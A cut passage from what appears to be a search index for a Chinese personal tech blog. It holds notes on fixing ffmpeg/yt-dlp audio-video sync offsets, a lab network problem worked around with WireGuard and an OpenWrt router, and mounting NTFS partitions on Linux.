<p>\u539f\u56e0\u5728\u4e8e\u8fd9\u91cc\u7684duration\u662f\u5305\u542bstart_pts\u7684\uff0c\u56e0\u6b64\u6e90\u89c6\u9891\u7684video\u5c31\u6bd4audio\u5c11\u7ea60.5s</p> <p>\u4f7f\u7528setpts\uff08\u540e\u9762\u53d1\u73b0\u8be5\u547d\u4ee4\u662ffilter\u56e0\u6b64\u9700\u8981\u8f6c\u7801\uff0c\u901f\u5ea6\u5f88\u6162\uff0c\u5b9e\u9645\u4e0a\u5bf9\u53ef\u4ee5input video\u5355\u72ec\u8bbe\u7f6einput pts offset\uff0c\u540e\u9762\u4f1a\u7528\u5230\u8be5\u547d\u4ee4\u8fdb\u884c\u4fee\u590d\uff09\uff0c\u53ef\u4ee5\u590d\u73b0duration\u5dee\u503c\u53d8\u5927 <pre><code> ffmpeg -i src.mkv -filter_complex \"[0:v]setpts=PTS-STARTPTS[v];[0:a]asetpts=PTS-STARTPTS[a]\" -map \"[v]\" -map \"[a]\" setpts.mkv\n</code></pre></p> <pre><code>Input #0, matroska,webm, from 'setpts.mkv':\n  Metadata:\n    ENCODER         : Lavf58.76.100\n  Duration: 00:08:41.01, start: 0.000000, bitrate: 20558 kb/s\n  Stream #0:0: Video: h264 (High 10), yuv420p10le(tv, bt2020nc/bt2020/bt2020-10, progressive), 3840x2160 [SAR 1:1 DAR 16:9], 59.94 fps, 59.94 tbr, 1k tbn, 119.88 tbc (default)\n    Metadata:\n      ENCODER         : Lavc58.134.100 libx264\n      DURATION        : 00:08:40.540000000\n  Stream #0:1: Audio: vorbis, 48000 Hz, 5.1, fltp (default)\n    Metadata:\n      ENCODER         : Lavc58.134.100 libvorbis\n      DURATION        : 00:08:41.006000000\nstart_pts=0\nstart_time=0.000000\nstart_pts=0\nstart_time=0.000000\n</code></pre>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u731c\u60f3\u95ee\u9898\u539f\u56e0","title":"\u731c\u60f3\u95ee\u9898\u539f\u56e0","text":"<p>\u53ef\u4ee5\u770b\u5230\u6211\u4e0a\u4f20\u5230B\u7ad9\u7684\u6587\u4ef6\u89c6\u9891\u6d41\u7684\u8d77\u59cb\u5e27\u7684pts\u4e3a0.613s\uff0c\u5dee\u4e0d\u591a\u6b63\u662fB\u7ad9\u97f3\u753b\u4e0d\u540c\u6b65\u7684\u65f6\u95f4 <pre><code>Input #0, matroska,webm, from 'src.mkv':\n  Metadata:\n    ENCODER         : Lavf58.76.100\n  Duration: 00:08:41.15, start: 0.000000, bitrate: 24909 kb/s\n  Stream #0:0: Video: hevc (Main 10), yuv420p10le(tv, bt2020nc/bt2020/bt2020-10), 3840x2160 [SAR 1:1 DAR 16:9], 59.94 fps, 59.94 tbr, 1k tbn, 59.94 tbc (default)\n    Metadata:\n      DURATION        : 00:08:41.149000000\n  Stream #0:1: Audio: aac_latm (LC) ([2][22][0][0] / 0x1602), 48000 Hz, 5.1, fltp (default)\n    Metadata:\n      DURATION        : 00:08:41.002000000\nstart_pts=613\nstart_time=0.613000\nstart_pts=0\nstart_time=0.000000\n</code></pre> \u5e76\u4e14\u7ecf\u8fc7\u5f88\u591a\u6b21\u8f6c\u7801\u5b9e\u9a8c\uff0c\u53d1\u73b0\u8f6c\u7801\u5e76\u4e0d\u80fd\u91cd\u7f6e\u6389\u8fd9\u4e2astart_pts\uff0c\u800c\u662f\u57fa\u672c\u5b8c\u5168\u4fdd\u7559 <pre><code>src.hevc.aac.60fps.mkv  start_pts=638\nsrc.hevc.aac.mkv  start_pts=638\nsrc.avc.mkv start_pts=638\n</code></pre></p> <p>\u800cstart_pts\u7684\u542b\u4e49\u4fbf\u662f\u89c6\u9891\u7684\u7b2c\u4e00\u5e27\u5e94\u8be5\u663e\u793a\u51fa\u6765\u7684\u65f6\u95f4\u3002 \u5982\u679c\u6211\u628a\u8fd9\u4e2apts\u91cd\u7f6e\u4e3a0\uff0c\u89c6\u9891\u5c31\u4f1a\u6bd4\u97f3\u9891\u63d0\u524d\uff08\u5047\u8bbe\u539f\u672c\u7684pts\uff0c\u97f3\u753b\u662f\u540c\u6b65\u7684\u8bdd\uff09</p> <p>\u800cyt-dlp\u4e0b\u8f7dB\u7ad9\u89c6\u9891\u65f6\uff0c\u89c6\u9891\u548c\u97f3\u9891\u662f\u5206\u5f00\u4e0b\u8f7d\uff0c\u6700\u540e\u518d\u5408\u5e76\u6210\u4e00\u4e2a\u89c6\u9891\u7684\u3002 \u6211\u89c2\u5bdf\u4e86\u597d\u51e0\u4e2ayt-dlp\u4e0b\u8f7d\u7684\u89c6\u9891\uff0c\u53d1\u73b0start_pts\u90fd\u53d8\u6210\u4e860\u3002\u6240\u4ee5\u731c\u6d4b\uff1a - B\u7ad9\u8f6c\u7801\u7684\u65f6\u5019\u5c06pts\u91cd\u7f6e\u4e3a\u4e860\uff08\u6bcf\u4e2aframe \u505a\u5982\u4e0bfilter\uff1a<code>[0:v]setpts=PTS-STARTPTS[v]</code>\uff09 - \u540e\u9762\u53d1\u73b0yt-dlp\u5408\u5e76\u65f6\u4e22\u5f03\u4e86\u539f\u672c\u7684ts\uff0c\u5c06\u4e24\u4e2a\u6d41\u5f53\u4f5cstart_pts=0\u8fdb\u884c\u5408\u5e76\u7684\u3002B\u7ad9\u7684\u89c6\u9891\u548c\u97f3\u9891\u6587\u4ef6\u662f\u6709offset - \u4f46\u662f\u5373\u4f7f\u624b\u52a8-copyts\u5408\u5e76\uff0c\u4ecd\u7136\u4e0d\u540c\u6b65\uff0c\u5e76\u4e14\u8fd9\u6b21\u53d8\u6210\u97f3\u9891\u63d0\u524d\u4e86\u3002 UDPATE: \u662fyt-dlp\u4f1a\u6e05\u9664timestamps\u3002\u4e0d\u8fc7\u8fd9\u91cc\u7684\u95ee\u9898\u5728\u4e8eB\u7ad9\u597d\u50cf\u4e5f\u5ffd\u7565\u4e86\u65f6\u95f4\u6233\uff0c\u5bfc\u81f4\u4e0d\u540c\u6b65</p> <p>\u81f3\u4e8e\u4e3a\u4ec0\u4e48\u4e00\u5f00\u59cb\u4f7f\u7528-ss\u526a\u8f91\u51fa8\u5206\u949f\u7684\u7247\u6bb5\u65f6\uff0cpts\u4e3a613\u800c\u4e0d\u662f\u5e72\u8106\u7f6e\u4e3a0\u3002\u6000\u7591\u6d41\u590d\u5236\u60c5\u51b5\uff0c\u53ea\u80fdseek\u5230pos\u4e4b\u540e\u7684\u4e00\u4e2a\u5173\u952e\u5e27\uff08\u800c\u4e0d\u662fchatgpt\u544a\u8bc9\u6211\u7684seek\u5230\u4e4b\u524d\u7684\u5173\u952e\u5e27\uff09</p>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u5176\u5b83","title":"\u5176\u5b83","text":"","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u53d1\u73b0\u539f\u59cb\u89c6\u9891\u6709\u4e24\u4e2aaudio","title":"\u53d1\u73b0\u539f\u59cb\u89c6\u9891\u6709\u4e24\u4e2aaudio","text":"<pre><code>Input #0, mpegts, from '2022-12-31 \u7b2c73\u56deNHK \u7d05\u767d\u6b4c\u5408\u6226 NHK BS4K.m2ts':\n  Duration: 04:25:01.42, start: 61.462067, bitrate: 26406 kb/s\n  Program 101\n  Stream #0:0[0x1011]: Video: hevc (Main 10) (HESE / 0x45534548), yuv420p10le(tv, bt2020nc/bt2020/bt2020-10), 3840x2160 [SAR 1:1 DAR 16:9], 59.94 fps, 59.94 tbr, 90k tbn, 59.94 tbc\n  Stream #0:1[0x1100]: Audio: aac_latm (LC) ([17][0][0][0] / 0x0011), 48000 Hz, stereo, fltp\n  Stream #0:2[0x1c00]: Data: bin_data ([6][0][0][0] / 0x0006)\n  Stream #0:3[0x1c01]: Data: bin_data ([6][0][0][0] / 0x0006)\n  Stream #0:4[0x1101]: Audio: aac_latm (LC) ([17][0][0][0] / 0x0011), 48000 Hz, stereo, fltp\nUnsupported codec with id 100359 for input stream 2\nUnsupported codec with id 100359 for input stream 3\nstart_pts=5577842\nstart_time=61.976022\nstart_pts=5531586\nstart_time=61.462067\nstart_pts=5531586\nstart_time=61.462067\nstart_pts=5531586\nstart_time=61.462067\nstart_pts=5589186\nstart_time=62.102067\n</code></pre>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#youtube\u6ca1\u95ee\u9898","title":"youtube\u6ca1\u95ee\u9898","text":"<p>yt-dlp\u5408\u5e76\u89c6\u9891\u548c\u97f3\u9891\u65f6\uff0c\u7a76\u7adf\u662f\u5982\u4f55\u5bf9\u51c6ts\u7684\uff1f <pre><code>Input #0, mpegts, from 'youtube.f312.mp4':\n  Duration: 00:08:41.15, start: 0.016678, bitrate: 5441 kb/s\n  Program 1\n  Stream #0:0[0x100]: Video: h264 (High) ([27][0][0][0] / 0x001B), yuv420p(tv, bt709, progressive), 1920x1080 [SAR 1:1 DAR 16:9], 59.94 fps, 59.94 tbr, 90k tbn, 119.88 tbc\nstart_pts=1501\nstart_time=0.016678\n\nInput #0, mov,mp4,m4a,3gp,3g2,mj2, from 'youtube.f380.m4a':\n  Metadata:\n    major_brand     : dash\n    minor_version   : 0\n    compatible_brands: iso6mp41\n    creation_time   : 2024-01-02T23:44:20.000000Z\n  Duration: 00:08:41.15, start: 0.000000, bitrate: 384 kb/s\n  Stream #0:0(und): Audio: ac3 (ac-3 / 0x332D6361), 48000 Hz, 5.1(side), fltp, 384 kb/s (default)\n    Metadata:\n      creation_time   : 2024-01-02T23:44:20.000000Z\n      handler_name    : ISO Media file produced by Google Inc.\n      vendor_id       : [0][0][0][0]\n    Side data:\n      audio service type: main\nstart_pts=0\nstart_time=0.000000\n\nInput #0, matroska,webm, from 'youtube.mkv':\n  Metadata:\n    ENCODER         : Lavf58.76.100\n  Duration: 00:08:41.15, start: 0.000000, bitrate: 5661 kb/s\n  Stream #0:0: Video: h264 (High), yuv420p(tv, bt709, progressive), 1920x1080 [SAR 1:1 DAR 16:9], 59.94 fps, 59.94 tbr, 1k tbn, 119.88 tbc (default)\n    Metadata:\n      DURATION        : 00:08:41.154000000\n  Stream #0:1: Audio: ac3, 48000 Hz, 5.1(side), fltp, 384 kb/s (default)\n    Metadata:\n      HANDLER_NAME    : ISO Media file produced by Google Inc.\n      VENDOR_ID       : [0][0][0][0]\n      DURATION        : 00:08:41.152000000\nstart_pts=0\nstart_time=0.000000\nstart_pts=0\nstart_time=0.000000\n</code></pre></p> <p>\u624b\u52a8merge + -copyts <pre><code>Input #0, matroska,webm, from 'youtube-hand-merge2.mkv':\n  Metadata:\n    ENCODER         : Lavf58.76.100\n  Duration: 00:08:41.17, start: 0.000000, bitrate: 5661 kb/s\n  Stream #0:0: Video: h264 (High), yuv420p(tv, bt709, progressive), 1920x1080 [SAR 1:1 DAR 16:9], 59.94 fps, 59.94 tbr, 1k tbn, 119.88 tbc (default)\n    Metadata:\n      DURATION        : 00:08:41.171000000\n  Stream #0:1: Audio: ac3, 48000 Hz, 5.1(side), fltp, 384 kb/s (default)\n    Metadata:\n      HANDLER_NAME    : ISO Media file produced by Google Inc.\n      VENDOR_ID       : [0][0][0][0]\n      DURATION        : 00:08:41.152000000\nstart_pts=17\nstart_time=0.017000\nstart_pts=0\nstart_time=0.000000\n</code></pre></p>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u8bbe\u7f6e\u8f93\u5165\u548c\u8f93\u51fapts","title":"\u8bbe\u7f6e\u8f93\u5165\u548c\u8f93\u51fapts","text":"<p>\u5c1d\u8bd5cut + reset offset - \u91cd\u70b9\u5728\u4e8e-itsoffset\u662f\u5bf9\u8f93\u5165\u7684\u6587\u4ef6\u7684\u6240\u6709\u6d41\u52a0\u4e0a\u4e00\u4e2a\u504f\u79fb - \u800coutput\u5219\u662f\u5bf9\u8f93\u51fa\u7684\u518d\u52a0\u4e0a\u4e2a\u504f\u79fb <pre><code>ffmpeg -vn -ss 0.613 -itsoffset 0.613 -i ../src.mkv -an -i ../src.mkv -c copy -map 0:a -map 1:v -output_ts_offset -0.613 output_combined.mkv\n\n\nInput #0, matroska,webm, from 'output_combined.mkv':\n  Metadata:\n    ENCODER         : Lavf58.76.100\n  Duration: 00:08:40.59, start: 0.000000, bitrate: 24935 kb/s\n  Stream #0:0: Audio: aac_latm (LC) ([2][22][0][0] / 0x1602), 48000 Hz, 5.1, fltp (default)\n    Metadata:\n      DURATION        : 00:08:40.438000000\n  Stream #0:1: Video: hevc (Main 10), yuv420p10le(tv, bt2020nc/bt2020/bt2020-10), 3840x2160 [SAR 1:1 DAR 16:9], 59.94 fps, 59.94 tbr, 1k tbn, 59.94 tbc (default)\n    Metadata:\n      DURATION        : 00:08:40.585000000\nstart_pts=55\nstart_time=0.055000\nstart_pts=0\nstart_time=0.000000\n</code></pre></p> <p>\u6587\u4ef6duration\u7684\u4e0d\u53ef\u9760\uff0c\u662f\u5305\u542b\u4e86start_pts\u7684 - \u8fd9\u89e3\u91ca\u4e86\u4e3a\u4ec0\u4e48\u4eceB\u7ad9\u4e0b\u8f7d\u7684\u6587\u4ef6\uff0cstart_pts\u53d80\u540e\uff0c\u4e3a\u4ec0\u4e48duration\u76f8\u5dee\u5f88\u5927 - \u76f8\u5f53\u4e8estream\u548c\u6587\u4ef6duration\uff0cduration\u90fd\u662f\u8ba1\u7b97\u6700\u957f\u7684\uff1f</p>","tags":["ffmpeg"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/01/2022-07-01-%E5%AE%9E%E9%AA%8C%E5%AE%A4%E7%BD%91%E7%BB%9C%E9%A3%8E%E6%B3%A2/","title":"\u5b9e\u9a8c\u5ba4\u7f51\u7edc\u98ce\u6ce2","text":"","tags":["wireguard"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/01/2022-07-01-%E5%AE%9E%E9%AA%8C%E5%AE%A4%E7%BD%91%E7%BB%9C%E9%A3%8E%E6%B3%A2/#\u5b9e\u9a8c\u5ba4\u7f51\u7edc\u98ce\u6ce2","title":"\u5b9e\u9a8c\u5ba4\u7f51\u7edc\u98ce\u6ce2","text":"<p>6\u670821\u53f7\u4e0b\u53485\u70b9\u5de6\u53f3\u5b9e\u9a8c\u5ba4\u65ad\u7f51\u4e86(\u73b0\u8c61\u662fping\u767e\u5ea6\u5ef6\u8fdf5,6\u79d2\uff09\uff0c\u7136\u540e\u6765\u7684\u7ef4\u4fee\u4eba\u5458\u8bf4\u7f51\u53e3\u4e0a\u4e0d\u5141\u8bb8\u63d2\u8def\u7531\u5668\u3002\u7136\u540e\u6211\u4fbf\u628a\u8def\u7531\u5668\u65ad\u4e86\u3002\u7ecf\u8fc7\u4e00\u4e24\u5c0f\u65f6\u540e\u7f51\u7edc\u624d\u6062\u590d\u3002\u6211\u671f\u95f4\u95ee\u4e86fjw\uff0c\u89c9\u5f97\u6ca1\u6709\u4e0d\u8ba9\u7528\u8def\u7531\u5668\u8fd9\u4e2a\u8bf4\u6cd5\u3002\u665a\u4e0a\u4fbf\u5c06\u8def\u7531\u5668\u63d2\u56de\u53bb\u4e86\uff0c\u7f51\u7edc\u6ca1\u51fa\u5565\u95ee\u9898\u3002 6\u670823\u53f7\u4e0a\u534811\u70b9\uff0c\u5b9e\u9a8c\u5ba4\u53c8\u65ad\u7f51\u4e86\u3002czw\u628a\u6211\u8def\u7531\u5668\u62d4\u4e86\u3002\u6211\u89c9\u5f97\u5982\u679c\u62d4\u6389\u671f\u95f4\u7f51\u7edc\u8fd8\u51fa\u95ee\u9898\uff0c\u4e5f\u80fd\u8bf4\u660e\u4e0d\u662f\u8def\u7531\u5668\u7684\u539f\u56e0\u3002\u4f46\u662f\u52306\u670830\u53f7\u7f51\u7edc\u8fd8\u6ca1\u6709\u51fa\u95ee\u9898\uff08\u671f\u95f4\u6211\u5728\u8865\u8bfe\u7a0b\u7efc\u8ff0\uff0c\u5b8c\u5168\u6ca1\u8bbf\u95ee\u53f0\u5f0f\u673a\uff0c\u6240\u4ee5\u65e0\u611f\uff09\u3002\u6240\u4ee5\u9a8c\u8bc1\u8ba1\u5212\u5931\u8d25\u3002\u4e0d\u8fc7\u6574\u4e2a\u8fc7\u7a0b\u4e2d\uff0c\u5c0f\u9ec4\u7684\u8def\u7531\u5668\u662f\u4e00\u76f4\u63d2\u5728\u7f51\u53e3\u4e0a\u9762\u7684\uff0c\u4f46\u662f\u597d\u50cf\u6ca1\u6709\u767b\u5f55\u6821\u56ed\u7f51\u8d26\u53f7\uff0c\u6240\u4ee5\u4e5f\u4e0d\u80fd\u8bf4\u660e\u95ee\u9898\u3002</p>","tags":["wireguard"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/01/2022-07-01-%E5%AE%9E%E9%AA%8C%E5%AE%A4%E7%BD%91%E7%BB%9C%E9%A3%8E%E6%B3%A2/#\u89e3\u51b3","title":"\u89e3\u51b3","text":"<p>\u6ca1\u529e\u6cd5\uff0c\u62116/30\u53bb\u5b9e\u9a8c\u5ba4\u6253\u7b97\u6062\u590d\u6211\u7684\u53f0\u5f0f\u673a\u8bbf\u95ee\u80fd\u529b\u3002\u60f3\u4e86\u51e0\u79cd\u65b9\u6848</p> <ul> <li>\u5230\u5b9e\u9a8c\u5ba4\u65f6\u4f7f\u7528\u53f0\u5f0f\u673a\u767b\u5f55\u6821\u56ed\u7f51\u8d26\u53f7\uff0c\u56de\u5bdd\u5ba4\u518d\u91cd\u65b0\u767b\u5f55\u6821\u56ed\u7f51\u3002\u8fd9\u79cd\u65b9\u5f0f\u4e0d\u4ec5\u9ebb\u70e6\uff0c\u800c\u4e14\u8fd8\u6709\u5176\u5b83\u95ee\u9898\uff1a</li> <li>\u65e0\u6cd5\u4e24\u53f0\u8bbe\u5907\u4e0a\u7f51\uff1a\u73b0\u5728\u5b9e\u9a8c\u5ba4\u6211\u6709\u4e24\u53f0\u8bbe\u5907\uff08\u53f0\u5f0f\u548c\u7b14\u8bb0\u672c\uff09\uff0c\u7b14\u8bb0\u672c\u8fdeustcnet\u5f97\u767b\u6821\u56ed\u7f51\uff0c\u53f0\u5f0f\u673a\u8fde\u6709\u7ebf\u4e5f\u5f97\u767b\u6821\u56ed\u7f51\u3002</li> <li>\u6ca1\u6cd5\u5171\u7528\u952e\u9f20\uff1a\u6211\u7b14\u8bb0\u672c\u548c\u53f0\u5f0f\u901a\u8fc7barrier\u5171\u7528\u952e\u9f20\uff0c\u73b0\u5728\u6ca1\u529e\u6cd5\u901a\u8fc7\u5c40\u57df\u7f51\u5730\u5740\u8fde\u63a5\u4e86\u3002</li> <li>\u56de\u5bdd\u5ba4\u6ca1\u6cd5\u8bbf\u95ee\u53f0\u5f0f\uff1a\u867d\u7136\u539f\u672copenwrt\u8def\u7531\u5668WAN\u53e3dhcp\u5f97\u5230\u7684ipv6\u5730\u5740\u662f\u4e0d\u53d8\u7684\u5730\u5740\uff0c\u662f\u901a\u8fc7MAC+FFE0\u751f\u6210\uff0c\u4f46\u662f\u53f0\u5f0fubuntu\u5f97\u5230\u7684ipv6\u5374\u603b\u662f\u5728\u53d8\u3002\u6240\u4ee5\u56de\u4e86\u5bdd\u5ba4\u540e\uff0c\u53f0\u5f0f\u673a\u6ca1\u6cd5\u4f7f\u7528\u57df\u540d\uff08\u6ca1\u7f51\u53bb\u66f4\u65b0ddns\uff09\u4e5f\u6ca1\u6cd5\u901a\u8fc7ip\u8bbf\u95ee</li> <li>\u53f0\u5f0f\u673a\u548c\u8f7b\u8584\u672c\u90fd\u901a\u8fc7wireguard\uff0c\u8fde\u63a5\u5230\u5bdd\u5ba4\u8def\u7531\u5668\u4e0a\u7f51\u3002\u8fd9\u6837\u5b50\u786e\u5b9e\u8fd8\u80fd\u7528\uff0c\u4f46\u662f\u8fd8\u662f\u6709\u95ee\u9898</li> <li>barrier\u53ef\u4ee5\u4f7f\u7528wireguard\u914d\u7f6e\u7684\u79c1\u6709\u5730\u5740\u8bbf\u95ee\uff0c\u4f46\u662f\u8fd9\u6837\u9700\u8981\u6211\u5bdd\u5ba4\u8def\u7531\u5668\u8f6c\u53d1\uff0c\u6709\u65f6\u4f1a\u660e\u663e\u5361\u987f\u3002</li> <li>\u4f7f\u7528wireguard\u6ca1\u6cd5\u4f7f\u7528ipv6\u4e0a\u7f51\u4e86\uff08\u6211\u4e0d\u6e05\u695awireguard\u600e\u4e48\u914d\u7f6e\uff09</li> <li>\u56de\u5bdd\u5ba4\u8bbf\u95ee\u53f0\u5f0f\u673a\u53ea\u80fd\u4f7f\u7528wireguard\u7684\u79c1\u6709\u5730\u5740\u3002\u6211\u5728\u53f0\u5f0f\u673a\u4e0a\u914d\u7f6e\u4e86\u5982SMB\u7b49\u670d\u52a1\uff0c\u6211\u7684\u7b14\u8bb0\u672c\u3001\u5e73\u677f\uff0c\u4f7f\u7528\u65f6\u90fd\u5f97\u6253\u5f00wireguard\uff0c\u8fdc\u6ca1\u6709\u4e4b\u524d\u8fde\u4e0a\u4efb\u610f\u8def\u7531\u5668\u5c31\u80fd\u4f7f\u7528\u7684\u987a\u7545\u611f\u3002</li> <li>\u4e4b\u524d\u8f6f\u4ef6\u91cc\u914d\u7f6e\u7684ip\u90fd\u5f97\u91cd\u65b0\u914d\u7f6e</li> </ul> <p>\u6211\u672c\u6765\u662f\u60f3\u628a\u8def\u7531\u5668\u62ff\u6389\uff0c\u76f4\u5230\u5b9e\u9a8c\u5ba4\u7f51\u7edc\u518d\u51fa\u95ee\u9898\u7684\uff08\u6709\u70b9\u8d4c\u6c14\uff09\u3002\u4f46\u662f\u7a81\u7136\u60f3\u5230\uff0c\u65e2\u7136\u9650\u5236\u662f\u4e0d\u767b\u6821\u56ed\u7f51\u8d26\u53f7\uff0c\u90a3\u6211\u8ba9\u5b9e\u9a8c\u5ba4\u7684\u8def\u7531\u5668\u901a\u8fc7vpn\u8fde\u5230\u6211\u5bdd\u5ba4\u7684\u8def\u7531\u5668\u4e0a\u7f51\u4e0d\u5c31\u884c\u4e86\uff1f\u6211\u4e4b\u524d\u662f\u8ba9\u5bdd\u5ba4\u7684\u8def\u7531\u5668\u8d70\u5b9e\u9a8c\u5ba4\u7684\u8def\u7531\u5668\uff0c\u73b0\u5728\u53ea\u8981\u7b80\u5355\u53cd\u8fc7\u6765\u5c31\u597d\u4e86\u3002\u6539\u52a8\u4e4b\u540e\u548c\u6211\u4e4b\u524d\u7684\u7f51\u7edc\u73af\u5883\u5b8c\u5168\u6ca1\u6709\u533a\u522b\u3002</p>","tags":["wireguard"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/01/2022-07-01-%E5%AE%9E%E9%AA%8C%E5%AE%A4%E7%BD%91%E7%BB%9C%E9%A3%8E%E6%B3%A2/#\u5c0f\u95ee\u9898","title":"\u5c0f\u95ee\u9898","text":"<p>\u4f46\u662f\u6b64\u65f6\u9047\u5230\u4e86\u4e2a\u5c0f\u95ee\u9898\uff0c\u53f0\u5f0f\u673a\u867d\u7136\u80fd\u8bbf\u95eeb\u7ad9\uff0c\u4f46\u662f\u7a81\u7136\u65e0\u6cd5\u79d1\u5b66\u4e0a\u7f51\u4e86\u3002clash\u6d4b\u901f\u663e\u793a\u8d85\u65f6\u3002\u6211\u8bd5\u4e86ping\u68af\u5b50\u670d\u52a1\u5668\u57df\u540d\u662f\u53ef\u4ee5ping\u901a\u7684\uff0c\u4f46\u662fcurl\u4f7f\u7528\u4ee3\u7406\u8bbf\u95ee\u8c37\u6b4c\u4f1a\u8fd4\u56de502\u9519\u8bef\u3002</p> <pre><code>\u279c  clash curl -v http://google.com\n* Uses proxy env variable no_proxy == 'localhost,127.0.0.0/8,::1'\n* Uses proxy env variable http_proxy == 'http://localhost:11223/'\n*   Trying 127.0.0.1:11223...\n* Connected to localhost (127.0.0.1) port 11223 (#0)\n&gt; GET http://google.com/ HTTP/1.1\n&gt; Host: google.com\n&gt; User-Agent: curl/7.81.0\n&gt; Accept: */*\n&gt; Proxy-Connection: Keep-Alive\n&gt; \n* Mark bundle as not supporting multiuse\n&lt; HTTP/1.1 502 Bad Gateway\n&lt; Connection: keep-alive\n&lt; Keep-Alive: timeout=4\n&lt; Proxy-Connection: keep-alive\n&lt; Content-Length: 0\n&lt; \n* Connection #0 to host localhost left intact\n</code></pre> <p>\u6700\u540e\u53d1\u73b0\u662f\u6211\u7684\u9632\u706b\u5899\u914d\u7f6e\u7684DMZ\u7684\u95ee\u9898\u3002\u4e3a\u4e86\u8054\u673a\u602a\u730e\uff0c\u6211\u4e4b\u524d\u5c1d\u8bd5\u8ba9\u5bdd\u5ba4\u7684\u7b14\u8bb0\u672c\u80fd\u591f\u5904\u4e8eFull Cone NAT\u7c7b\u578b\u4e2d\uff08openwrt\u9ed8\u8ba4\u662fsymmetric NAT\uff09\uff0c\u627e\u5230\u7684\u65b9\u6cd5\u662f\u6dfb\u52a0\u8fd9\u6837\u7684\u914d\u7f6e</p> <p></p> <ul> <li>\u57fa\u672c\u7684\u89c4\u5219\u662fwan-&gt;this device\uff0c\u4f46\u662f\u6211\u7684\u8def\u7531\u5668\u901a\u8fc7vpn\u8f6c\u53d1\u7ed9\u53e6\u4e00\u4e2a\u8def\u7531\u5668\u4e0a\u7f51\uff0c\u6240\u4ee5\u8fd9\u91cc\u662fvpn-&gt;this device\uff0c\u540c\u65f6\u53e6\u4e00\u53f0\u8def\u7531\u5668\u4e0a\u8fd8\u5f97\u914d\u7f6e</li> </ul> <p></p> <p>\u4f46\u662f\u6b64\u6b21\u6211\u5c06\u4e0a\u7f51\u65b9\u5f0f\u8c03\u6362\u4e86\uff0c\u6240\u4ee5\u4e0a\u9762\u7684\u89c4\u5219\u5c31\u6709\u95ee\u9898\u4e86\u3002\u5c06\u4e0a\u9762\u7684\u8f6c\u53d1\u53bb\u6389\u540e\uff0c\u7f51\u7edc\u6062\u590d\u4e86\u6b63\u5e38\u3002</p>","tags":["wireguard"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/","title":"\u53f0\u5f0f\u673a\u6539\u9020\u8ba1\u5212","text":"<p>\u8bb0\u5f55\u4e86\u5bf9\u5c06\u53f0\u5f0f\u673a\u4ecewindows\u6362\u4f4dlinux\u540e\u6298\u817e\u7684\u5404\u79cd\u5185\u5bb9</p>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#linux\u6302\u8f7dntfs\u5206\u533a","title":"linux\u6302\u8f7dntfs\u5206\u533a","text":"<ul> <li> <p>\u4e0d\u8003\u8651\u548cwindows\u517c\u5bb9\u7684\u8bdd\uff08\u5728linux\u4e0b\u521b\u5efa\u7684\u6587\u4ef6\uff0c\u5728windows\u4e2d\u4f1a\u663e\u793a\u4e3a\u5176\u5b83\u7528\u6237\u5bfc\u81f4\u65e0\u6cd5\u8bbf\u95ee\uff09</p> </li> <li> <p>\u5c06own\u8bbe\u7f6e\u4e3a\u6307\u5b9a\u7528\u6237\u548c\u7ec4</p> </li> <li>umask\u8868\u793a\u6587\u4ef6\u548c\u76ee\u5f55\u6743\u9650\u54ea\u4e9b\u4f4d\u4e3a0\uff0c0022\u5373755</li> </ul> <pre><code>sudo mount -t ntfs-3g -o umask=0022,gid=1000,uid=1000 /dev/sda2 /home/yfy/D\n</code></pre> <ul> <li>\u8003\u8651\u548cwindows\u517c\u5bb9\uff08\u53cc\u7cfb\u7edf\uff09\uff0c\u9700\u8981\u624b\u52a8\u8bbe\u7f6ewindows\u548clinux\u7528\u6237\u6620\u5c04\u3002</li> </ul> <pre><code>sudo mount -t ntfs-3g -o usermapping=/home/yfy/UserMapping,umask=0022,utf8 /dev/sda2 /home/yfy/D\n</code></pre> <ul> <li> <p>\u5176\u5b83</p> </li> <li> <p>umount\u5360\u7528\u5931\u8d25</p> <pre><code>umount -l ... #lazy umount\n</code></pre> </li> <li> <p>\u6dfb\u52a0\u5230fstab\u81ea\u52a8\u6302\u8f7d</p> <pre><code>UUID=7E3AF70F3AF6C367  /home/yfy/D  ntfs  usermapping=/home/yfy/app/ntfs-3g/UserMapping,umask=0022 0 0\n</code></pre> <p>\u8bf4\u660e\uff1a</p> <ul> <li>fstab\u683c\u5f0f</li> </ul> <pre><code>[Device] [Mount Point] [File System Type] [Options] [Dump] [Pass]\n</code></pre> <ul> <li> <p>device\u57df</p> </li> <li> <p>Label : LABEL=label</p> </li> <li>Network ID<ul> <li>Samba : //server/share</li> <li>NFS : server:/share</li> <li>SSHFS : sshfs#user@server:/share</li> </ul> </li> <li> <p>Device : /dev/sdxy (not recommended)</p> </li> <li> <p>\u83b7\u5f97UUID</p> </li> </ul> <pre><code>sudo blkid\n</code></pre> </li> <li> <p>\u53c2\u8003\uff1a</p> </li> </ul> <p>\u5b98\u65b9\u6587\u6863\uff1aUbuntu Manpage: ntfs-3g - Third Generation Read/Write NTFS Driver</p> <p>\u7c7b\u4f3c\u95ee\u9898\uff1ahttps://askubuntu.com/a/514870</p> <ul> <li>\u56de\u7b54\uff1ahttps://askubuntu.com/posts/514870/edit<ul> <li>\u56de\u7b54\u4e2d\u63d0\u5230\u7684\u7f51\u9875\uff08\u56e0\u4e3a\u539f\u7f51\u9875\u4e0d\u5728\u4e86\uff0c\u4f7f\u7528\u4e86webarchive\uff09\uff1aOwnership and Permissions 